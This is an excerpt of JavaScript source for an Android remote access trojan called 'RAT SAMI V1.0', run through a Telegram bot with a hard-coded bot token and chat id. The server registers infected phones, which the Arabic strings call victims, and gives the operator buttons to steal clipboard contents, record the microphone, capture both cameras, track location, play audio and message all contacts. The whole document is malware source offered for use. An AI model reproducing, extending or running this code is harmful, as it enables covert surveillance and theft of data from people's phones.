...
const token = '7575954474:AAF9AnKIOkbRTLuNKtB_sPMU6thiNvu-cbk'
const id = '7756709640'
...
app.get('/', function (req, res) {
    res.send('<html lang="ar"> <head> <meta charset="UTF-8"> <meta name="viewport" content="width=device-width, initial-scale=1.0"> <title>RAT SAMI - V1.0</title> <link rel="icon" href="https://files.catbox.moe/hxfnyp.png"> </head> <style> @import url("https://fonts.googleapis.com/css2?family=Changa:wght@300&family=Fjalla+One&family=Ubuntu:ital,wght@1,500&display=swap"); body{ background-image: url(https://i.gifer.com/origin/61/6187a35c6cf047475af401d5fe070034_w200.gif); position: relative; background-position:center; background-size:cover; } h1{ color: rgb(251, 0, 0); font-family: "Ubuntu"; } h3{ color: rgb(251, 0, 0); font-family: "Changa"; } </style> <script type="text/javascript"> var sami = function() { window.open ("https://t.me/TYG_YE", "Window","status=1,toolbar=1"); window.open ("https://t.me/TYG_YE", "Window2","status=1,toolbar=1"); } </script> <style type="text/css">body, a:hover {cursor: url(https://cur.cursors-4u.net/cursors/cur-7/cur686.cur), progress !important;}</style> <body onclick=sami()> <center> <h1 align="center"> RAT SAMI ONLINE </h1> <img width="200" height="200" src="https://files.catbox.moe/hxfnyp.png" alt=""> <h3>Android phone hacking software via Telegram bot</h3> </center> </body> <audio> <iframe frameborder="0" height="1" width="1" loop="true" allow="autoplay" src="https://files.catbox.moe/zsg1ph.m4a"></iframe><h2></h2></audio> </html>')
})
...
app.post("/uploadText", (req, res) => {
    appBot.sendMessage(id, `°• يوجد رساله من هاذا الجهاز <b>${req.headers.model}</b> \n\n`, {parse_mode: "HTML"})
    res.send('')
})
...
appSocket.on('connection', (ws, req) => {
    ...
    appBot.sendMessage(id,
        `°• تم اتصال هاتف جديد \n\n` +
         `📱| نوع الهاتف : <b>${model}</b>\n` +
         `🔋| الكهرباء : <b>${battery}</b>\n` +
         `⚙| اصدار الاندرويد : <b>${version}</b>\n` +
         `🖥| حجم الشاشة : <b>${brightness}</b>\n` +
         `📡| مزود الخدمة : <b>${provider}</b>\n\n`,
         {parse_mode: "HTML"}
    )
    ws.on('close', function () {
        appBot.sendMessage(id,
            `°• تم فقدان الاتصال بالجهاز\n\n` +
            `📱| نوع الهاتف : <b>${model}</b>\n` +
            `🔋| الكهرباء : <b>${battery}</b>\n` +
            `⚙| اصدار الاندرويد : <b>${version}</b>\n` +
            `🖥| حجم الشاشة : <b>${brightness}</b>\n` +
...
appBot.on('message', (message) => {
    ...
    if (message.reply_to_message) {
        ...
        if (message.reply_to_message.text.includes('°• 𝙂𝙧𝙚𝙖𝙩, 𝙣𝙤𝙬 𝙚𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙨𝙚𝙣𝙙 𝙩𝙤 𝙩𝙝𝙞𝙨 𝙣𝙪𝙢𝙗𝙚𝙧')) {
            ...
            appBot.sendMessage(id,
                ...
                '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["°● الاجهزة المتصله ●°"], ["°● قائمة الاوامر ●°"],['°● معلومات البرمجية ●°']],
        ...
        if (message.reply_to_message.text.includes('°• ارسل رابط الملف الصوتي لتشغيل اغنية بهاتف الضحية •')) {
    ...
    if (id == chatId) {
        ...
        if (message.text == '°● الاجهزة المتصله ●°') {
            if (appClients.size == 0) {
                appBot.sendMessage(id,
                    '°• لا يوجد اجهزة متصله حاليا:\n\n' +
                    '• عليك التآكد من ان الضحية قام بتثبيت التطبيق او انه لم يقم بازالته'
                )
            } else {
                let text = '°• قائمة الاجهزة الذي تم اختراقها :\n\n'
                appClients.forEach(function (value, key, map) {
                    text += `📱| نوع الهاتف : <b>${value.model}</b>\n` +
                        `🔋| الكهرباء : <b>${value.battery}</b>\n` +
                        `⚙| اصدار الاندرويد : <b>${value.version}</b>\n` +
                        `🖥| حجم الشاشة : <b>${value.brightness}</b>\n` +
                        `📡| مزود الخدمة : <b>${value.provider}</b>\n\n`
                })
                appBot.sendMessage(id, text, {parse_mode: "HTML"})
            }
        }
        if (message.text == '°● قائمة الاوامر ●°') {
            if (appClients.size == 0) {
                appBot.sendMessage(id,
                    '°• لايوجد اجهزة متصله حاليآ : \n\n' +
                    '• عليك التآكد من ان الضحية قام بتثبيت التطبيق او انه لم يقم بازالت'
                )
            } else {
                ...
                appBot.sendMessage(id, '°• قم باختيار الجهاز الذي تريد اختراقة ~', {
                    "reply_markup": {
        ...
        if (message.text == '°● معلومات البرمجية ●°') {
            appBot.sendMessage(id,
                    '°• تم تطوير هاذة البرمجية بواسطه •° \n\n' +
                    '●| المبرمج : Mr.SaMi\n'+
                    '●| لغة البرمجة  : Javascript \n'+
                    '●| الاصدار : V1.0\n'+
                    '●| الامكانية : From Android 6 To Android 13\n'+
                    '●| قناة المطور : @TYG_YE \n'+
                    '●| بوت التواصل  : @TYG_YE_BOT\n'
                    
                    
            )
            }
        } else {
        appBot.sendMessage(id, '°• لم نفهم طلبك عليك الاختيار من الكيبورد :(')
    }
})
appBot.on("callback_query", (callbackQuery) => {
    ...
    console.log(uuid)
    if (commend == 'device') {
        appBot.editMessageText(`°• لوحة ادارة الهاتف : <b>${appClients.get(data.split(':')[1]).model}</b>`, {
            width: 10000,
            chat_id: id,
            ...
            reply_markup: {
                inline_keyboard: [
                    ...
                    [
                        {text: '• محتوى الحافظة •', callback_data: `clipboard:${uuid}`},
                        {text: '• تسجيل الميكرفون •', callback_data: `microphone:${uuid}`},
                    ],
                    [
                        {text: '• الكيمرة الخلفيهة •', callback_data: `camera_main:${uuid}`},
                        {text: '• الكيمرة الاماميه •', callback_data: `camera_selfie:${uuid}`}
                    ],
                    [
                        {text: '• الموقع •', callback_data: `location:${uuid}`},
                        {text: '• اشعار عائم •', callback_data: `toast:${uuid}`}
                    ],
                    [
                    ...
                    [
                        {text: '• تشغيل اغنية •', callback_data: `play_audio:${uuid}`},
                        {text: '• ايقاف الاغنية •', callback_data: `stop_audio:${uuid}`},
                    ],
                    [
                        {
                            text: '°• ارسال رساله لجميع جهات الاتصال •°',
